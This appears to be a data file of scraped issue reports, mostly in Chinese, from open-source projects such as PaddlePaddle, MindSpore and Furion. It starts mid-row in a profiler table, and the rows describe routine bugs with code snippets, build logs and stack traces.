-&gt; Device) 0.00% 0.000us 0.00% 0.000us 0.000us 5.465ms 76.93% 5.465ms 5.465ms 1 [] cudaStreamSynchronize 0.00% 74.000us 0.00% 74.000us 74.000us 0.000us 0.00% 0.000us 0.000us 1 [] aten::zeros 0.00% 156.000us 0.01% 226.000us 11.300us 0.000us 0.00% 0.000us 0.000us 20 [[], [], [], [], []] aten::empty 0.00% 71.000us 0.00% 71.000us 1.775us 0.000us 0.00% 0.000us 0.000us 40 [[], [], [], [], [], []] aten::zero_ 0.00% 24.000us 0.00% 24.000us 1.200us 0.000us 0.00% 0.000us 0.000us 20 [[1]] ops_profile 0.01% 458.000us 0.03% 1.171ms 58.550us 0.000us 0.00% 1.639ms 81.950us 20 [] aten::log_normal_ 0.01% 410.000us 0.02% 688.000us 34.400us 1.639ms 23.07% 1.639ms 81.950us 20 [[10, 10, 10, 10, 10, 10, 10], [], [], []] cudaLaunchKernel 0.01% 278.000us 0.01% 278.000us 13.900us 0.000us 0.00% 0.000us 0.000us 20 []"
异常被FlowExecutor吃掉,业务异常: Node(throw e) -&gt; Chain(throw e) -&gt; FlowExecutor 到这里异常被吃掉了。 不利于框架对异常的统一处理。   <code>: chain.execute(slotIndex); // FlowExecutor.java:281
动态图转静态图保存后，载入模型时，无法改变输入数据的batchsize,"PaddlePaddle版本：1.8 保存模型代码 使用模型的代码 在生产环境部署时，batch_size必须和训练时的batch_size一致，否则会产生如下报错 这也就意味着使用TracedLayer和load_inference_model接口，如果需要改变服务器端的batch_size，就必须重新训练模型。 请问有什么解决方法或者api可以实现可以在加载模型后，使用任意长度的batch_size吗   <code>: out_dygraph, static_layer = TracedLayer.trace(DeepSortNet, inputs=[image]) static_layer.save_inference_model('infer_model') image = np.random.random([1,3,128, 64]).astype('float32') program, feed_vars, fetch_vars = fluid.io.load_inference_model('infer_model', exe) fetch, = exe.run(program, feed={feed_vars[0]: image}, fetch_list=fetch_vars) InvalidArgumentError: The 'shape' in ReshapeOp is invalid. The input tensor X'size must be equal to the capacity of 'shape'. But received X's shape = [128, 128, 1, 1], X's size = 16384, 'shape' is [1, 128], the capacity of 'shape' is 128. [Hint: Expected capacity == in_size, but received capacity:128 != in_size:16384.] at (D:\1.8.5\paddle\paddle\fluid\operators\reshape_op.cc:206)"
ValidateForm 增加 RemoveValidator 方法,ValidateForm 增加 RemoveValidator 方法 通过 组件 方法中增加验证到表单中，再 方法中移除自己，通过此机制可以实现动态调整表单内验证组件   <code>: ValidateBase OnInitialized AsyncDispose
maven中冗余jar包引入,模块： farm-core 冗余项目： 因为已经有一个beanUtils了： 影响代码段 删掉后将com.farm.core.sql.result.DataResult中 改为   <code>: &lt;dependency&gt; &lt;groupId&gt;com.sun.commons&lt;/groupId&gt; &lt;artifactId&gt;beanutils&lt;/artifactId&gt; &lt;version&gt;1.6.1-20070314&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-beanutils&lt;/groupId&gt; &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt; &lt;version&gt;1.9.2&lt;/version&gt; &lt;/dependency&gt; import com.sun.org.apache.commons.beanutils.BeanUtils; import org.apache.commons.beanutils.BeanUtils;
"[CT][MS][generate]F.norm, axis out of index, core dump","F.norm，输入轴越界，core dump / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :2b33ed4a -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph python torch: raise IndexError core dump   <code>: from mindspore import ops from mindspore import Tensor, dtype x = Tensor([[1, 1, 1]], dtype.float32) ops.norm(x, 6, 6, False, 0.142)"
"develop branch build using manylinux image error /opt/python/cp27-cp27mu/include/python2.7/pyconfig.h:1194:0: error: ""_POSIX_C_SOURCE"" redefined [-Werror]","build error message:   <code>: In file included from /opt/python/cp27-cp27mu/include/python2.7/Python.h:8:0, from /paddle/paddle/fluid/pybind/protobuf.h:17, from /paddle/paddle/fluid/pybind/pybind.cc:22: /opt/python/cp27-cp27mu/include/python2.7/pyconfig.h:1194:0: error: ""_POSIX_C_SOURCE"" redefined [-Werror] #define _POSIX_C_SOURCE 200112L ^ In file included from /opt/rh/devtoolset-2/root/usr/include/c++/4.8.2/x86_64-redhat-linux/bits/os_defines.h:39:0, from /opt/rh/devtoolset-2/root/usr/include/c++/4.8.2/x86_64-redhat-linux/bits/c++config.h:2097, from /opt/rh/devtoolset-2/root/usr/include/c++/4.8.2/utility:68, from /opt/rh/devtoolset-2/root/usr/include/c++/4.8.2/algorithm:60, from /paddle/paddle/fluid/pybind/pybind.cc:14: /usr/include/features.h:162:0: note: this is the location of the previous definition # define _POSIX_C_SOURCE 200809L ^ In file included from /opt/python/cp27-cp27mu/include/python2.7/Python.h:8:0, from /paddle/paddle/fluid/pybind/protobuf.h:17, from /paddle/paddle/fluid/pybind/pybind.cc:22: /opt/python/cp27-cp27mu/include/python2.7/pyconfig.h:1216:0: error: ""_XOPEN_SOURCE"" redefined [-Werror] #define _XOPEN_SOURCE 600 ^ In file included from /opt/rh/devtoolset-2/root/usr/include/c++/4.8.2/x86_64-redhat-linux/bits/os_defines.h:39:0, from /opt/rh/devtoolset-2/root/usr/include/c++/4.8.2/x86_64-redhat-linux/bits/c++config.h:2097, from /opt/rh/devtoolset-2/root/usr/include/c++/4.8.2/utility:68, from /opt/rh/devtoolset-2/root/usr/include/c++/4.8.2/algorithm:60, from /paddle/paddle/fluid/pybind/pybind.cc:14: /usr/include/features.h:164:0: note: this is the location of the previous definition # define _XOPEN_SOURCE 700 ^"
"testsuites It_posix_pthread.c等文件中去掉不必要的extern ""C""判断","【任务描述】 1、extern ""C""只用于函数声明前，在头文件中使用，不需要在c文件中使用 2、testsuites It_posix_pthread.c等文件的注释中__cpluscplus拼写也出错，多个c。 【解决方案】 去掉c语言文件中的 和 【任务来源】 代码检视：   <code>: #ifdef __cplusplus #if __cplusplus extern ""C"" { #endif /* __cplusplus */ #endif /* __cplusplus */ #ifdef __cplusplus #if __cplusplus } #endif /* __cplusplus */ #endif /* __cplusplus */"
"[CT][MS]When F.derivative is used in construct, an error is reported in graph mode.","F.jet、F.derivative放在construct里使用，图模式会报错 / 硬件环境: /device GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph pytest test.py 用例pass   <code>: class Net1(Cell): def __init__(self): super().__init__() self.add = P.Add() def construct(self, x, y): return self.add(x, y) def jax_add(x, y): return lax.add(x, y) @Author('hwx1042891') @Level0 def test_jet_add_2_inputs_1_output_fp32(): class Net(Cell): def __init__(self, net): super().__init__() self.net = net def construct(self, x, y): out, prime = F.jet(self.net, (x, x), (y, y)) return out, prime contextbase.case_prepare() net = Net1() x = Tensor([1, 1], dtype.float32) y = Tensor([[1, 1], [0, 0]], dtype.float32) ms_net = Net(net) ms_out = ms_net(x, y) # jax_out = jet(jax_add, jnp.array(([1, 1], [1, 1])), ((jnp.array([1, 1]), jnp.array([0, 0])), # (jnp.array([1, 1]), jnp.array([0, 0])),)) comparebase.compare_nparray(ms_out[0].asnumpy(), [2, 2], 0.0001, 0.0001) comparebase.compare_nparray(ms_out[1].asnumpy(), [[2, 2], [0, 0]], 0.0001, 0.0001) contextbase.case_cleanup()"
对不起我是初学者。线性回归这一章恳请各位帮忙,"学习目标：尝试通过训练获取Y=AX+BX+CX这样的式子中的参数 首先我先定义了两个np_array import os import paddle.v2 as paddle import numpy as np with_gpu = os.getenv('WITH_GPU', '0') != '0' def main(): # init paddle.init(use_gpu=with_gpu, trainer_count=1) X = np.random.rand(1000,3) //这里的Y是我给定的一个公式，其实就是为了生成一套训练的目标数据。未来用于对比。 Y = 5* X[:,0]+7<em>X[:,1]+9</em>X[:,2]+11+0.01*np.random.rand(1000,1) 然后我就不太会写了。怎么应用paddlepaddle中的线性回归读取、训练呢？ 我按例子里的写： y_predict = paddle.layer.fc(input=X, size=1, act=paddle.activation.Linear()) 报错了。 错误信息：AssertionError   <code>: readerx = paddle.reader.creator.np_array(X) readery = paddle.reader.creator.np_array(Y)"
crud对话框点击全屏按钮，警告报错,"dialog-form.vue文件125行，默认传0是数值，期望的是字符串。 异常日志 结果报warning 版本号2.9.3   <code>: dialogTop () { return (!this.isDrawer &amp;&amp; !this.fullscreen) ? this.crud.tableOption.dialogTop : 0 },"
[GraphKernel] bert-crf precision error with graph_kernel,": /device gpu 运行bert-crf mindspore侧精度仅为0.145288，目标精度为93%。AKG侧跑json文件，有两个json部分输出为nan，猜测可能导致精度问题。 akg侧跑精度异常的Json output：   <code>: {""composite"":true,""composite_graph"":""30418.30418.30418"",""id"":1819,""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[32,43,1],""tensor_name"":""input_0""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[32,43,43],""tensor_name"":""input_1""}]],""op"":""Fused_Equal_Cast_Cast_ReduceSum_Reshape_Add_split_5811933072008979617"",""op_desc"":[{""attr"":null,""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[32,43,1],""tensor_name"":""input_0""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_1"",""shape"":[32,43,43],""tensor_name"":""input_1""}]],""name"":""Equal"",""output_desc"":[{""data_type"":""bool"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,43,43],""tensor_name"":""output_0_0""}]},{""attr"":[{""data_type"":""bool"",""name"":""is_backed_cast"",""value"":false},{""data_type"":""str"",""name"":""dst_type"",""value"":""float32""}],""impl_path"":"""",""input_desc"":[[{""data_type"":""bool"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[32,43,43],""tensor_name"":""output_0_0""}]],""name"":""Cast"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,43,43],""tensor_name"":""output_0_1""}]},{""attr"":[{""data_type"":""listInt"",""name"":""axis"",""value"":[2]},{""data_type"":""bool"",""name"":""keep_dims"",""value"":false}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[32,43,43],""tensor_name"":""output_0_1""}]],""name"":""ReduceSum"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,43],""tensor_name"":""output_0_2""}]},{""attr"":[{""data_type"":""listInt"",""name"":""shape"",""value"":[32,43,1]}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[32,43],""tensor_name"":""output_0_2""}]],""name"":""Reshape"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,43,1],""tensor_name"":""output_0_3""}]},{""attr"":null,""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[32,43,1],""tensor_name"":""output_0_3""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_1"",""shape"":[1],""tensor_name"":""input_6"",""value"":1.0000000195414814e-24}]],""name"":""Add"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,43,1],""tensor_name"":""output_0_4""}]}],""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[32,43,43],""tensor_name"":""output_0_1""},{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[32,43,1],""tensor_name"":""output_0_4""}],""platform"":""AKG"",""process"":""cuda""} {""composite"":true,""composite_graph"":""29778.29778.29778"",""id"":2331,""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[32,1,1],""tensor_name"":""input_0""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[32,1,43],""tensor_name"":""input_1""}]],""op"":""Fused_Equal_Cast_Cast_ReduceSum_Reshape_Add_split_8957536074215339945"",""op_desc"":[{""attr"":null,""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[32,1,1],""tensor_name"":""input_0""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_1"",""shape"":[32,1,43],""tensor_name"":""input_1""}]],""name"":""Equal"",""output_desc"":[{""data_type"":""bool"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,1,43],""tensor_name"":""output_0_0""}]},{""attr"":[{""data_type"":""bool"",""name"":""is_backed_cast"",""value"":false},{""data_type"":""str"",""name"":""dst_type"",""value"":""float32""}],""impl_path"":"""",""input_desc"":[[{""data_type"":""bool"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[32,1,43],""tensor_name"":""output_0_0""}]],""name"":""Cast"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,1,43],""tensor_name"":""output_0_1""}]},{""attr"":[{""data_type"":""listInt"",""name"":""axis"",""value"":[2]},{""data_type"":""bool"",""name"":""keep_dims"",""value"":false}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[32,1,43],""tensor_name"":""output_0_1""}]],""name"":""ReduceSum"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,1],""tensor_name"":""output_0_2""}]},{""attr"":[{""data_type"":""listInt"",""name"":""shape"",""value"":[32,1,1]}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[32,1],""tensor_name"":""output_0_2""}]],""name"":""Reshape"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,1,1],""tensor_name"":""output_0_3""}]},{""attr"":null,""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[32,1,1],""tensor_name"":""output_0_3""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_1"",""shape"":[1],""tensor_name"":""input_6"",""value"":1.0000000195414814e-24}]],""name"":""Add"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[32,1,1],""tensor_name"":""output_0_4""}]}],""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[32,1,43],""tensor_name"":""output_0_1""},{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[32,1,1],""tensor_name"":""output_0_4""}],""platform"":""AKG"",""process"":""cuda""} (array([[[ 0., 0., 0., ..., 0., 0., 0.], [ 0., 0., 0., ..., 0., 0., 0.], [ 0., 0., 0., ..., 0., 0., 0.], ..., [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan]], [[nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], ..., [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan]], [[nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], ..., [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan]], ..., [[nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], ..., [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan]], [[nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], ..., [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan]], [[nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], ..., [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan]]], dtype=float32), array([[[1.e-24], [1.e-24], [1.e-24], ..., [1.e-24], [1.e-24], [1.e-24]], [[1.e-24], [1.e-24], [1.e-24], ..., [1.e-24], [1.e-24], [1.e-24]], [[1.e-24], [1.e-24], [1.e-24], ..., [1.e-24], [1.e-24], [1.e-24]], ..., [[1.e-24], [1.e-24], [1.e-24], ..., [1.e-24], [1.e-24], [1.e-24]], [[1.e-24], [1.e-24], [1.e-24], ..., [1.e-24], [1.e-24], [1.e-24]], [[1.e-24], [1.e-24], [1.e-24], ..., [1.e-24], [1.e-24], [1.e-24]]], dtype=float32))"
远程请求时，一直报 Object reference not set to an instance of an object.,"Furion 版本号 2.19.0 Web 项目类型 WebApi WebApi 调用远程请求时，一直报： Object reference not set to an instance of an object. at Furion.RemoteRequest.HttpRequestPart.d__113.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Runtime.CompilerServices.TaskAwaiter1.GetResult() at DTECH.FaceRecognition.Service.person.PersonService.d__1.MoveNext() in F:\01Item\FaceRecognition\DTECH.FaceRecognition.Service\person\PersonService.cs:line 39 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 代码如下？ public async Task Query() { QueryPerson queryPerson = new QueryPerson(); queryPerson.cmd = ""request persons""; queryPerson.role = -1; queryPerson.page_no = 1; queryPerson.page_size = 10; queryPerson.condition = string.Empty; var res = await ""https://172.16.21.27:8000"" .SetBody(JsonConvert.SerializeObject(queryPerson), ""application/json"", Encoding.UTF8) .PostAsStringAsync(); Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos --- 返回正常的结果 关注 Furion 如果您喜欢或正使用 Furion，Furion 也能帮助到您，可以考虑给 Furion 一个 Star。   <code>: 1.GetResult() at Furion.RemoteRequest.HttpRequestPart.&lt;SendAsStringAsync&gt;d__112.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Runtime.CompilerServices.TaskAwaiter }"
[ST][MS][SERVING]Serving安装界面描述不清晰，没有提到os限制以及安装指令里python_version描述不够完善   ,"Serving安装界面描述不清晰，没有提到os限制以及安装指令里python_version描述不够完善 / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :commit_id = ''[sha1]:8edb949d,[branch]:(HEAD,origin/master,origin/HEAD,master)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_doc_0001 Docs : commit 0872802f3406dd84a2d257ca644041fee30cb5d6 (HEAD -&gt; master, origin/master, origin/HEAD) https://www.mindspore.cn/serving/docs/zh-CN/master/serving_install.html 描述清晰 开发责任人：徐永飞   <code>: 未描述目前仅支持linux Python_version未描述python3.8支持的写法。"
adminlte.js最近更新的问题,"public/assets/js/adminlte.js文件为了“优化移动端左侧菜单栏滑动体验”而进行的更新有如下问题： 更新内容是在原155行处插入了以下代码 但这段代码在有触摸屏的笔记本上反而还不如之前的体验，具体表现为左侧菜单区域的宽度出现了滚动条的占位偏移，并且在将左侧切换到mini视图时，菜单显示不全。 在带有触摸屏的笔记本上， 的结果为true，但它毕竟不是移动端，使用这样的后台管理系统时毕竟还是鼠标优先 截图如下：   <code>: if ('ontouchstart' in document.documentElement) { $.AdminLTE.options.sidebarSlimScroll = false; $("".main-sidebar"").css({height: ($(window).height() - $("".main-header"").height()) + ""px"", overflow: ""scroll""}); } 'ontouchstart' in document.documentElement"
原生页面swagger-ui.html 404,"！！！有人遇到这种情况 #现象 使用knife4j 3.0.3访问doc.html可以，但访问swagger-ui.html 404,同时引入springfox-swagger-ui也无效果 #pom依赖：   <code>: &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.0.3&lt;/version&gt; &lt;/dependency&gt;"
jbc2mpl : incorrect array type,"jbc2mpl used incorrect array type in a function jbc2mpl generated from OpenJDK 8 jar files since Reg0_R33542 is a 2D array of i16, the array types in the last statement should have been something like The array types in other statements are also need to be fixed, use specific types instead of ref.   <code>: jaxp/src/com/sun/org/apache/xerces/internal/impl/dtd/DTDGrammar.java 1926 protected void setContentSpec(int contentSpecIndex, XMLContentSpec contentSpec) { 1927 int chunk = contentSpecIndex &gt;&gt; CHUNK_SHIFT; 1928 int index = contentSpecIndex &amp; CHUNK_MASK; 1929 1930 fContentSpecType[chunk][index] = contentSpec.type; 1931 fContentSpecValue[chunk][index] = contentSpec.value; 1932 fContentSpecOtherValue[chunk][index] = contentSpec.otherValue; 1933 } func &amp;Lcom_2Fsun_2Forg_2Fapache_2Fxerces_2Finternal_2Fimpl_2Fdtd_2FDTDGrammar_3B_7CsetContentSpec_7C_28ILcom_2Fsun_2Forg_2Fapache_2Fxerces_2Finternal_2Fimpl_2Fdtd_2FXMLContentSpec_3B_29V var %Reg0_R33542 &lt;* &lt;[] &lt;* &lt;[] i16&gt;&gt;&gt;&gt; var %Reg0_R20092 &lt;* &lt;$Ljava_2Flang_2FObject_3B&gt;&gt; dassign %Reg5_R45768 0 (dread ref %_this) dassign %Reg0_R33542 0 (iread ref &lt;* &lt;$Lcom_2Fsun_2Forg_2Fapache_2Fxerces_2Finternal_2Fimpl_2Fdtd_2FDTDGrammar_3B&gt;&gt; 29 (dread ref %Reg5_R45768)) dassign %Reg0_R20092 0 (iread ref &lt;* &lt;* &lt;$Ljava_2Flang_2FObject_3B&gt;&gt;&gt; 0 (array 1 ptr &lt;* &lt;[] ref&gt;&gt; (dread ref %Reg0_R33542, dread i32 %Reg3_I))) dassign %Reg0_R0000 0 (iread ptr &lt;* &lt;* &lt;[] i16&gt;&gt;&gt; 0 (array 1 ptr &lt;* &lt;[] &lt;* &lt;[] i16&gt;&gt;&gt;&gt; (dread ref %Reg0_R33542, dread i32 %Reg3_I)))"
【众智】【计算-AICPU开发】ResizeBilinearV2,"ResizeBilinearV2 AICPU算子适配 + <del>functional接口</del> + CPU算子迁移 + 算子反向 双线性插值调整图像大小 算子原语 接口目录：mindspore/ops/operations/image_ops.py images float16、float32、float64 size y align_corners bool 属性 half_pixel_centers bool 属性 对应底层算子 3. 异常处理 4. 算子反向 ResizeBilinearV2Grad   <code>: class ResizeBilinearV2(Primitive): REG_OP(ResizeBilinearV2) .INPUT(x, TensorType({DT_INT8, DT_UINT8, DT_INT16, DT_UINT16, DT_INT32, DT_INT64, DT_FLOAT16, DT_FLOAT, DT_DOUBLE})) .INPUT(size, TensorType({DT_INT32})) .OUTPUT(y, TensorType({DT_UINT8, DT_FLOAT})) .ATTR(align_corners, Bool, false) .ATTR(half_pixel_centers, Bool, false) .ATTR(dtype, Type, DT_FLOAT) .OP_END_FACTORY_REG(ResizeBilinearV2)"
GPU版本RuntimeError,"容器内运行GPU版本提示RuntimeError Hardware Environment: /device gpu : -- Singularity 3.7: -- Python 3.7.5: -- Linux Ubuntu 18.04 docker image from dockerhub: Install the singularity container; Use to download the image; Run the test code by command .   <code>: # test_nonlinear.py from mindspore import context context.set_context(mode=context.GRAPH_MODE, device_target=""GPU"") import numpy as np from mindspore import dataset as ds from mindspore import nn, Tensor, Model import time from mindspore.train.callback import Callback, LossMonitor, ModelCheckpoint def get_data(num, a=2.0, b=3.0): for _ in range(num): x = np.random.uniform(-1.0, 1.0) noise = np.random.normal(0, 0.03) z = a * x ** 2 + b + noise # 返回数据的时候就返回数据的平方 yield np.array([x**2]).astype(np.float32), np.array([z]).astype(np.float32) def create_dataset(num_data, batch_size=16, repeat_size=1): input_data = ds.GeneratorDataset(list(get_data(num_data)), column_names=['x','z']) input_data = input_data.batch(batch_size) input_data = input_data.repeat(repeat_size) return input_data data_number = 1600 # 一共产生1600组数据 batch_number = 16 # 分为16组分别进行优化 repeat_number = 2 # 重复2次，可以取到更低的损失函数值 ds_train = create_dataset(data_number, batch_size=batch_number, repeat_size=repeat_number) # dict_datasets = next(ds_train.create_dict_iterator()) class LinearNet(nn.Cell): def __init__(self): super(LinearNet, self).__init__() self.fc = nn.Dense(1, 1, 0.02, 0.02) def construct(self, x): x = self.fc(x) return x net = LinearNet() model_params = net.trainable_params() print ('Param Shape is: {}'.format(len(model_params))) for net_param in net.trainable_params(): print(net_param, net_param.asnumpy()) net_loss = nn.loss.MSELoss() # 设定优化算法，常用的是Momentum和ADAM optim = nn.Momentum(net.trainable_params(), learning_rate=0.005, momentum=0.9) model = Model(net, net_loss, optim) ckpt_cb = ModelCheckpoint() epoch = 1 # 设定每8个batch训练完成后就播报一次，这里一共播报25次 model.train(epoch, ds_train, callbacks=[LossMonitor(16), ckpt_cb], dataset_sink_mode=False) for net_param in net.trainable_params(): print(net_param, net_param.asnumpy()) singularity pull docker://mindsporexxx singularity exec --nv mindspore-gpu_1.2.0.sif python test_nonlinear.py Param Shape is: 2 Parameter (name=fc.weight, shape=(1, 1), dtype=Float32, requires_grad=True) [[0.02]] Parameter (name=fc.bias, shape=(1,), dtype=Float32, requires_grad=True) [0.02] [ERROR] DEVICE(5183,python):2021-05-29-11:35:27.180.012 [mindspore/ccsrc/runtime/device/gpu/cuda_driver.cc:244] set_current_device] cudaSetDevice 0 failed, ret[999], unknown error [ERROR] SESSION(5183,python):2021-05-29-11:35:27.180.116 [mindspore/ccsrc/backend/session/gpu_session.cc:99] Init] GPUSession failed to set current device id:0 Traceback (most recent call last): File ""test_nonlinear.py"", line 55, in &lt;module&gt; model.train(epoch, ds_train, callbacks=[LossMonitor(16), ckpt_cb], dataset_sink_mode=False) File ""/usr/local/python-3.7.5/lib/python3.7/site-packages/mindspore/train/model.py"", line 627, in train sink_size=sink_size) File ""/usr/local/python-3.7.5/lib/python3.7/site-packages/mindspore/train/model.py"", line 407, in _train self._train_process(epoch, train_dataset, list_callback, cb_params) File ""/usr/local/python-3.7.5/lib/python3.7/site-packages/mindspore/train/model.py"", line 536, in _train_process outputs = self._train_network(*next_element) File ""/usr/local/python-3.7.5/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 341, in __call__ out = self.compile_and_run(*inputs) File ""/usr/local/python-3.7.5/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 608, in compile_and_run self.compile(*inputs) File ""/usr/local/python-3.7.5/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 595, in compile _executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/usr/local/python-3.7.5/lib/python3.7/site-packages/mindspore/common/api.py"", line 494, in compile result = self._executor.compile(obj, args_list, phase, use_vm) RuntimeError: mindspore/ccsrc/backend/session/gpu_session.cc:99 Init] GPUSession failed to set current device id:0 Param Shape is: 2 Parameter (name=fc.weight, shape=(1, 1), dtype=Float32, requires_grad=True) [[0.02]] Parameter (name=fc.bias, shape=(1,), dtype=Float32, requires_grad=True) [0.02] [WARNING] DEBUG(4592,python):2021-05-29-11:27:32.011.795 [mindspore/ccsrc/debug/debugger/debugger.cc:80] Debugger] Not enabling debugger. Debugger does not support CPU. epoch: 1 step: 16, loss is 1.0789644 epoch: 1 step: 32, loss is 0.45110482 epoch: 1 step: 48, loss is 0.09512166 epoch: 1 step: 64, loss is 0.013987521 epoch: 1 step: 80, loss is 0.018784476 epoch: 1 step: 96, loss is 0.008460103 epoch: 1 step: 112, loss is 0.009134325 epoch: 1 step: 128, loss is 0.008378028 epoch: 1 step: 144, loss is 0.0063599395 epoch: 1 step: 160, loss is 0.0043385406 epoch: 1 step: 176, loss is 0.0028787663 epoch: 1 step: 192, loss is 0.0030280019 Parameter (name=fc.weight, shape=(1, 1), dtype=Float32, requires_grad=True) [[1.845962]] Parameter (name=fc.bias, shape=(1,), dtype=Float32, requires_grad=True) [3.0502906]"
文件下载功能：文件已丢失或不存在！,"表格中增加了一列，下载文件，但前台下载时提示，文件已丢失或不存在！ 重现步骤 （IDEA环境） 1.在表格的某列中增加一个操作（1.png为测试文件）： 2.在工程目录下添加测试文件1.png 3.rebuild、重启 4.访问该页面，点击下载按钮，提示 404 文件已丢失或不存在！ 404 文件已丢失或不存在！ 可能是如下原因引起的这个错误： 地址输入错误，链接已经失效过期. 您访问的地址为：/js/a/file/download/1.png 若有疑问请联系管理员.   <code>: actions.push('&lt;a href=""${ctx}/file/download/1.png""&gt;&lt;i class=""fa fa-download""&gt;&lt;/i&gt;&lt;/a&gt;&amp;nbsp;'); \jeesite\jeesite4\web\src\main\webapp\file\download\1.png"
建议为@Get，@Post等注解添加@Inherited元注解,"Forest: 1.5.28 Backend: springboot默认 需求 两个接口，地址一模一样，参数一模一样，但是请求头不一样，不一样,属于两个端的接口，伪代码如下 为了区分加方便，采用了接口继承，使用时，不同的类来完成，但是每次写新接口,重写后，注解都要写一遍，子类没有继承，伪代码如下 建议添加，之后可简化代码，简化注解   <code>: Content-type @Post(""${url}"") &lt;P&gt; ForestRequest&lt;?&gt; post(@Var(""url"") String url, @JSONBody P body); Autowire @Override @Post(""${url}"") &lt;P&gt; ForestRequest&lt;?&gt; post(@Var(""url"") String url, @Body P body);"
